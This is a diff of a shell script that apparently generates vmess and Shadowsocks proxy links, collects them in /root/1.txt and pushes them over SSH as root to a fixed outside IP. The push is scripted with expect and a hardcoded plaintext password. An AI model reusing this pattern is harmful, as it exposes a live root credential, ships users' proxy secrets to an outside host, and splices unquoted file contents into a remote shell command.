@@ -212,15 +212,15 @@ showlink() {
     link=`echo -n ${raw} | base64 -w 0`
     link="vmess://${link}"
     ss_link="${IP}:${ss_port}:${ss_user}:${ss_passwd}"
-    echo ${link} >> /root/1.txt
-    echo ${ss_link} >> /root/1.txt
+    All_link="${link}|${ss_link}"
+    echo ${All_link} >> /root/1.txt
 
 }
 
 send(){
     txt=$(cat 1.txt)
     /usr/bin/expect <<-EOF
-    spawn ssh root@18.222.212.8 -T "echo "$txt" >> /root/3333.txt"
+    spawn ssh root@18.222.212.8 -T "echo ${txt} >> /root/4444.txt"
     expect {
         "yes/no" { send "yes\r"; exp_continue }
         "password:" { send "1475963Aa@123\r" }
